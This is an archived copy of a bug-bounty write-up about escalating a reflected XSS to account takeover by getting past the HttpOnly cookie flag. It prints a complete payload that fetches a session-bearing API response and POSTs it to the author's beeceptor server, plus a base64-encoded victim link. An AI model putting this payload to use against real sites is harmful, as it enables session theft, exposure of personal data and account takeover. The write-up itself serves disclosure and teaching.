---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-08-10_defeat-the-httponly-flag-to-achieve-account-takeover-rxss.md
original_filename: 2022-08-10_defeat-the-httponly-flag-to-achieve-account-takeover-rxss.md
title: Defeat the HttpOnly flag to achieve Account Takeover | RXSS
category: documents
detected_topics:
- xss
- command-injection
- otp
- csrf
- api-security
tags:
- imported
- documents
- xss
- command-injection
- otp
- csrf
- api-security
language: en
raw_sha256: 815b9edb0cb57aa9fb86b40b901325d18dd00321b9472d8445ed0db66ec01726
text_sha256: fe0e525816ef3bd04ec8182df0e0c25a70379b3f3d729afa49931b8e4c5dbaaf
ingested_at: '2026-06-28T07:32:13Z'
sensitivity: unknown
redactions_applied: false
---

# Defeat the HttpOnly flag to achieve Account Takeover | RXSS

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-08-10_defeat-the-httponly-flag-to-achieve-account-takeover-rxss.md
- Source Type: markdown
- Detected Topics: xss, command-injection, otp, csrf, api-security
- Ingested At: 2026-06-28T07:32:13Z
- Redactions Applied: False
- Raw SHA256: `815b9edb0cb57aa9fb86b40b901325d18dd00321b9472d8445ed0db66ec01726`
- Text SHA256: `fe0e525816ef3bd04ec8182df0e0c25a70379b3f3d729afa49931b8e4c5dbaaf`


## Content

---
title: "Defeat the HttpOnly flag to achieve Account Takeover | RXSS"
url: "https://mohamedtarekq.medium.com/defeat-the-httponly-flag-to-achieve-account-takeover-rxss-c16849d3d192"
authors: ["Mohamed Tarek (@timooon107)"]
bugs: ["Reflected XSS", "Account takeover"]
publication_date: "2022-08-10"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2345
scraped_via: "browseros"
---

# Defeat the HttpOnly flag to achieve Account Takeover | RXSS

Defeat the HttpOnly flag to achieve Account Takeover | RXSS
Mohamed Tarek
Follow
4 min read
·
Aug 11, 2022

549

7

Hello folks, I’m Mohamed Tarek aka Timooon at Bugcrowd and HackerOne, In this write up I will explain how I get the victim’s session when it has HttpOnly flag to achieve Account Takeover via reflected XSS vulnerability.

As the program was private, let’s refer to it as target.com.

first of all let me tell you how I found the XSS:

I was testing the change email address functionality and when I changed my email address it redirect me to a URL like

https://xyz-target.com/authn/email/needverification?e=dGltb29vbkBidWdjcm93ZG5pbmphLmNvbQ==

Press enter or click to view image in full size

I notice that there is a base64 parameter (e) in the URL, so when decoded it I found that it’s my new email which is reflected in the page.

Therefore I decided to change the value of the base64 parameter (e) to XSS payload and encode it with base64.

Press enter or click to view image in full size

So when I navigated to https://xyz-target.com/authn/email/needverification?e=PGltZy9zcmMvb25lcnJvcj1hbGVydChkb2N1bWVudC5jb29raWUpPg== the alert was fired with my cookies.

Press enter or click to view image in full size

But unfortuenatly, the session has HttpOnly flag therefore I couldn’t get it via java script.

I know till now it’s a P3 severity Vulnerability, but I usually don’t stop here when I could run JS code.

So I investigated further to escalate this Vulnerability to ATO, stealing sensitive data or CSRF token …etc.

Achieving Account Takeover:

First thing I did is starting to analyze the source code and JS files to look for any ApiKey, Secret token, CSRF token ..etc.

Then I checked the LocalStorage if there are any sensitive data stored there, but sadly, I didn’t find anything important.

The next day after I had a good sleep, I fired up my burp suite to look for an endpoint that returns sensitive data or the user’s session. and I found an interesting one that returned the user’s PII information including the user’s session. This endpoint looks like this URL:

Get Mohamed Tarek’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

https://api.target.com/home/v1/UserPersonalization/mymodules?more=true

Press enter or click to view image in full size

Now I can send a request with the fetch method to this endpoint and steal the victim’s session in addition to his PII information.

Thanks to credentials: 'include' attribute in the fetch method which sends the victim's cookie with the request.
The fetch request will look like this:

fetch('https://api.target.com/home/v1/UserPersonalization/mymodules?more=true', {
  method: 'get',
  credentials: 'include',
  headers: {
  'Content-Type': 'application/json'
  }
}).then(response => response.text());

till now I have the content of the response and in fact, it was a big response, and we need to send this data to the attacker’s server.

The way I used to send this data to my server is with a POST XMLHttpRequest.

Sending data to the attacker’s server:

.then(data => {
  var xhr = new XMLHttpRequest();
  xhr.open('POST', 'https://timooon.free.beeceptor.com/data');
  xhr.send(data);
});

The final payload looks like below:

<img src onerror="fetch('https://api.target.com/home/v1/UserPersonalization/mymodules?more=true', {
  method: 'get',
  credentials: 'include',
  headers: {
  'Content-Type': 'application/json'
  }
}).then(response => response.text()).then(data => {
  var xhr = new XMLHttpRequest();
  xhr.open('POST', 'https://timooon.free.beeceptor.com/data');
  xhr.send(data);
});">

Encoding the final payload to base64 and delivering the link to the victim:

https://xyz-target.com.com/authn/email/needverification?e=PGltZyBzcmMgb25lcnJvcj0iZmV0Y2goJ2h0dHBzOi8vYXBpLnRhcmdldC5jb20vaG9tZS92MS9Vc2VyUGVyc29uYWxpemF0aW9uL215bW9kdWxlcz9tb3JlPXRydWUnLCB7CiAgICBtZXRob2Q6ICdnZXQnLAogICAgY3JlZGVudGlhbHM6ICdpbmNsdWRlJywKICAgIGhlYWRlcnM6IHsKICAgICAgICAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL2pzb24nCiAgICB9Cn0pLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UudGV4dCgpKS50aGVuKGRhdGEgPT4gewogICAgdmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwogICAgeGhyLm9wZW4oJ1BPU1QnLCAnaHR0cHM6Ly90aW1vb29uLmZyZWUuYmVlY2VwdG9yLmNvbS9kYXRhJyk7CiAgICB4aHIuc2VuZChkYXRhKTsKfSk7Ij4=

Press enter or click to view image in full size

And Voila! the response which contains the victim’s session and his PII information was sent to my server!

Finally, the submission was triaged and rewarded as P2, so to everyone who finds XSS vulnerability, please give yourself some time to escalate your finding severity.

Press enter or click to view image in full size

I hope you enjoyed reading and I will be very happy If you have any feedback.
